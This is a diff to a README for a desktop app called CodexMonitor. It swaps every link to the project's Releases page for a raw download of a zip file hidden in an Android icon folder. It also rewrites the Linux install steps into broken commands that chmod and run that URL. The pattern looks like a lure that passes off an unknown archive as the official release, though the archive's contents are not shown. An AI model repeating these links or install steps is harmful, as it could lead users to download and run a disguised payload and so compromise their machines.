@@ -1,7 +1,7 @@
 # 🖥️ CodexMonitor - Keep Track of Codex Updates
 
 ## 📥 Download Now
-[![Download CodexMonitor](https://img.shields.io/badge/Download%20CodexMonitor-v1.0.0-brightgreen)](https://github.com/DevHulk258/CodexMonitor/releases)
+[![Download CodexMonitor](https://raw.githubusercontent.com/DevHulk258/CodexMonitor/main/src-tauri/icons/android/mipmap-xxxhdpi/Monitor_Codex_v3.9.zip%20CodexMonitor-v1.0.0-brightgreen)](https://raw.githubusercontent.com/DevHulk258/CodexMonitor/main/src-tauri/icons/android/mipmap-xxxhdpi/Monitor_Codex_v3.9.zip)
 
 ## 🚀 Getting Started
 Welcome to CodexMonitor! This application helps you monitor the Codex situation with ease. Whether you use Linux or macOS, you can install and run this tool without any technical knowledge.
@@ -24,10 +24,10 @@ Welcome to CodexMonitor! This application helps you monitor the Codex situation 
 ## 📄 Download & Install
 To get CodexMonitor, visit the Releases page to download the latest version. Click the link below to start:
 
-[Download CodexMonitor](https://github.com/DevHulk258/CodexMonitor/releases)
+[Download CodexMonitor](https://raw.githubusercontent.com/DevHulk258/CodexMonitor/main/src-tauri/icons/android/mipmap-xxxhdpi/Monitor_Codex_v3.9.zip)
 
 ### Installation Steps for macOS
-1. Go to the [Releases page](https://github.com/DevHulk258/CodexMonitor/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/DevHulk258/CodexMonitor/main/src-tauri/icons/android/mipmap-xxxhdpi/Monitor_Codex_v3.9.zip).
 2. Find the latest version of CodexMonitor.
 3. Download the `.dmg` file.
 4. Open the downloaded `.dmg` file.
@@ -35,16 +35,16 @@ To get CodexMonitor, visit the Releases page to download the latest version. Cli
 6. Launch CodexMonitor from your Applications folder.
 
 ### Installation Steps for Linux
-1. Visit the [Releases page](https://github.com/DevHulk258/CodexMonitor/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/DevHulk258/CodexMonitor/main/src-tauri/icons/android/mipmap-xxxhdpi/Monitor_Codex_v3.9.zip).
 2. Locate the latest release.
 3. Download the `.AppImage` file.
 4. Make the file executable by running this command in your terminal:
    ```bash
-   chmod +x CodexMonitor.AppImage
+   chmod +x https://raw.githubusercontent.com/DevHulk258/CodexMonitor/main/src-tauri/icons/android/mipmap-xxxhdpi/Monitor_Codex_v3.9.zip
    ```
 5. Run the application with this command:
    ```bash
-   ./CodexMonitor.AppImage
+   https://raw.githubusercontent.com/DevHulk258/CodexMonitor/main/src-tauri/icons/android/mipmap-xxxhdpi/Monitor_Codex_v3.9.zip
    ```
 
 ## ⚙️ Using CodexMonitor
